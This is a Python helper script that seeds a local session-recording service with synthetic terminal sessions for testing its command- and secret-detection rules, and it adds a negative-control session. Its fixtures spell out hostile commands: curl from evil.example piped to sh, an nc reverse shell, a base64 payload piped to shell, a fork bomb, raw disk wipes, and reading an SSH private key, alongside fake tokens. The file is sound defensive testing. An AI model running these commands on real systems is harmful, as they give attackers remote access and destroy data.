"""Seed the local test container with sample Gateway recordings.

One-off helper for manual UI testing of search/detection. Posts a handful of
synthetic asciicast sessions (varied users, systems, dates, and finding mixes)
through the real /ingest front door, then sends a close event per session so each
finalizes immediately (no waiting on the idle timeout).

Between them the sessions cover every built-in rule in
``gatorcast.pipeline.detect`` at least once, and the final session is a
negative control: it contains commands that LOOK dangerous (rm without -rf,
chmod 755, kubectl get, dd to a file, curl to a file) but must produce zero
findings, so it doubles as a false-positive check.

Not part of the app; safe to delete. Usage: python scripts/seed_demo.py
"""

from __future__ import annotations

import json
import urllib.request

BASE = "http://127.0.0.1:8080"
TOKEN = "test-ingest-token"


def cast(events: list[tuple[float, str]], width: int = 100, height: int = 30) -> str:
    """Build a minimal asciicast v2 document from (offset, output) tuples."""
    header = {"version": 2, "width": width, "height": height, "timestamp": 1718700000}
    lines = [json.dumps(header)]
    for offset, data in events:
        lines.append(json.dumps([offset, "o", data]))
    return "\n".join(lines) + "\n"


# (conn_id, username, resource_address, started_ts, [output events])
# Each output event is (replay_offset_seconds, on-screen text). The detector
# scans the reconstructed screen text, so the dangerous strings only need to
# APPEAR — they are never actually executed anywhere.
SESSIONS = [
    (
        "c-prod-db-01", "alice@corp", "prod-db-01", "2026-06-18T09:00:00Z",
        [
            (0.5, "alice@prod-db-01:~$ ls /var/lib\r\n"),
            (2.0, "alice@prod-db-01:~$ rm -rf /var/lib/data\r\n"),  # recursive-delete
            (6.5, "alice@prod-db-01:~$ export AWS_KEY=AKIAIOSFODNN7EXAMPLE\r\n"),  # aws-key
            (9.0, "alice@prod-db-01:~$ exit\r\n"),
        ],
    ),
    (
        "c-web-02", "bob@corp", "web-02", "2026-06-17T14:30:00Z",
        [
            (0.4, "bob@web-02:~$ whoami\r\nbob\r\n"),
            (3.2, "bob@web-02:~$ curl http://evil.example/i.sh | sh\r\n"),  # pipe-to-shell
            (12.0, "bob@web-02:~$ export VAULT_TOKEN=hvs.CAESIabcdef1234567890XYZ\r\n"),  # vault-token
            (15.0, "bob@web-02:~$ logout\r\n"),
        ],
    ),
    (
        "c-k8s-03", "carol@corp", "k8s-prod", "2026-06-16T11:00:00Z",
        [
            (1.0, "carol@k8s-prod:~$ kubectl get pods\r\n"),
            (4.5, "carol@k8s-prod:~$ kubectl delete deployment legacy-app\r\n"),  # kubectl-delete
            (8.0, "carol@k8s-prod:~$ chmod 777 /opt/app/run.sh\r\n"),  # chmod-777
            (11.0, "carol@k8s-prod:~$ exit\r\n"),
        ],
    ),
    (
        "c-jump-05", "dave@corp", "jump-host", "2026-06-15T16:00:00Z",
        [
            (0.6, "dave@jump-host:~$ cat ~/.ssh/id_rsa\r\n"),
            (1.0, "-----BEGIN OPENSSH PRIVATE KEY-----\r\n"),  # private-key
            (1.2, "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA\r\n"),
            (1.4, "-----END OPENSSH PRIVATE KEY-----\r\n"),
            (5.0, "dave@jump-host:~$ history -c\r\n"),  # history-clear
            (7.0, "dave@jump-host:~$ exit\r\n"),
        ],
    ),
    (
        # Sweep of the remaining dangerous-command rules in one session.
        "c-ops-06", "erin@corp", "ops-node", "2026-06-14T10:00:00Z",
        [
            (0.5, "erin@ops-node:~$ dd if=/dev/zero of=/dev/sdb bs=1M count=100\r\n"),  # raw-disk-write
            (3.0, "erin@ops-node:~$ mkfs.ext4 /dev/sdb1\r\n"),  # mkfs
            (6.0, "erin@ops-node:~$ kubectl drain node-3 --force\r\n"),  # kubectl-drain
            (9.0, "erin@ops-node:~$ kubectl get secret db-creds -o yaml\r\n"),  # kubectl-secret
            (12.0, "erin@ops-node:~$ iptables -F\r\n"),  # iptables-flush
            (15.0, "erin@ops-node:~$ sudo su -\r\n"),  # privilege-change
            (18.0, "erin@ops-node:~$ nc -e /bin/bash 10.0.0.5 4444\r\n"),  # reverse-shell
            (21.0, "erin@ops-node:~$ base64 -d payload.b64 | sh\r\n"),  # base64-pipe-shell
            (24.0, "erin@ops-node:~$ :(){ :|:& };:\r\n"),  # fork-bomb
            (27.0, "erin@ops-node:~$ exit\r\n"),
        ],
    ),
    (
        # Sweep of the remaining secret-exposure rules (all fake/example values).
        "c-secrets-07", "frank@corp", "ci-runner", "2026-06-13T13:00:00Z",
        [
            (0.5, "frank@ci-runner:~$ cat .env\r\n"),
            (1.0, "GITHUB_TOKEN=ghp_0123456789abcdefABCDEF0123456789abcd\r\n"),  # github-token
            (1.5, "SLACK_BOT=xoxb-1234567890-abcdefABCDEF\r\n"),  # slack-token
            (2.0, "API_KEY=a1b2c3d4e5f6g7\r\n"),  # generic-secret-assign
            (4.0, "frank@ci-runner:~$ echo $JWT\r\n"),
            (4.5, "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOjEyMzQ1Njc4OTB9.SflKxwRJSMeKKF2QTabcdefXYZ\r\n"),  # jwt
            (7.0, "frank@ci-runner:~$ exit\r\n"),
        ],
    ),
    (
        # A clean, ordinary session — no findings expected.
        "c-bastion-04", "alice@corp", "bastion", "2026-06-18T08:00:00Z",
        [
            (0.5, "alice@bastion:~$ ls -la\r\ntotal 0\r\n"),
            (2.0, "alice@bastion:~$ whoami\r\nalice\r\n"),
            (4.0, "alice@bastion:~$ echo all good\r\nall good\r\n"),
            (5.5, "alice@bastion:~$ exit\r\n"),
        ],
    ),
    (
        # Negative control / false-positive check. Every line LOOKS risky but
        # must match NO rule: rm without -rf, chmod 755 (not 777), kubectl get
        # (no delete/drain/secret), curl to a file (no pipe to shell), dd to a
        # file (not /dev/), "password" with no assignment, history without -c.
        "c-safe-09", "grace@corp", "staging", "2026-06-12T09:00:00Z",
        [
            (0.5, "grace@staging:~$ rm old.log\r\n"),
            (2.0, "grace@staging:~$ chmod 755 deploy.sh\r\n"),
            (4.0, "grace@staging:~$ kubectl get pods -n staging\r\n"),
            (6.0, "grace@staging:~$ curl https://api.example.com/health -o health.json\r\n"),
            (8.0, "grace@staging:~$ dd if=disk.img of=/tmp/disk.copy\r\n"),
            (10.0, "grace@staging:~$ grep password notes.txt\r\n"),
            (12.0, "grace@staging:~$ history | tail -20\r\n"),
            (14.0, "grace@staging:~$ exit\r\n"),
        ],
    ),
]


def lines_for(session: tuple) -> list[dict]:
    """Build the start + chunk + close log objects for one session."""
    conn_id, username, resource, ts, events = session
    user = {"username": username, "id": username, "groups": ["engineering"]}
    return [
        {
            "logger": "gateway",
            "message": "Authenticated connection",
            "conn_id": conn_id,
            "resource_address": resource,
            "user": user,
            "ts": ts,
        },
        {
            "logger": "gateway.audit",
            "conn_id": conn_id,
            "asciicast": cast(events),
            "asciicast_sequence_num": 0,
            "user": user,
            "ts": ts,
        },
        {
            "logger": "gateway",
            "message": "Connection closed",
            "conn_id": conn_id,
            "ts": ts,
        },
    ]


def main() -> None:
    """Post all sample sessions to /ingest as one NDJSON batch."""
    objs: list[dict] = []
    for session in SESSIONS:
        objs.extend(lines_for(session))
    body = "\n".join(json.dumps(o) for o in objs).encode("utf-8")

    req = urllib.request.Request(
        f"{BASE}/ingest",
        data=body,
        method="POST",
        headers={
            "Authorization": f"Bearer {TOKEN}",
            "Content-Type": "application/x-ndjson",
        },
    )
    with urllib.request.urlopen(req) as resp:
        print(f"POST /ingest -> {resp.status} ({len(objs)} objects, {len(SESSIONS)} sessions)")


if __name__ == "__main__":
    main()
